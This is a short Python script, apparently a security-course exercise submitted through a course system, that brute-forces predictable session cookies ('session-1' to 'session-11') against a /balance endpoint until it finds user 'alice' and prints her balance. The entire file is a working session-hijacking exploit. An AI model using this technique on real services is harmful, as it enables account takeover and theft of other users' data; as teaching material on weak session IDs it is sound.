import sys
import requests
import json


def test_session(address):
	url = "{}/balance".format(address)
	amount = None
	for id in range(1,12):
		cookies = dict(sessionid='session-{}'.format(id))
		username = requests.get(url, cookies=cookies).json()['username']
		if username == 'alice':
			amount = int(requests.get(url, cookies=cookies).json()['balance'])
			break
	return amount

def main(argv):
	address = sys.argv[1]
	print(test_session(address))

# This makes sure the main function is not called immediatedly
# when TMC imports this module
if __name__ == "__main__": 
	if len(sys.argv) != 2:
		print('usage: python %s address' % sys.argv[0])
	else:
		main(sys.argv)
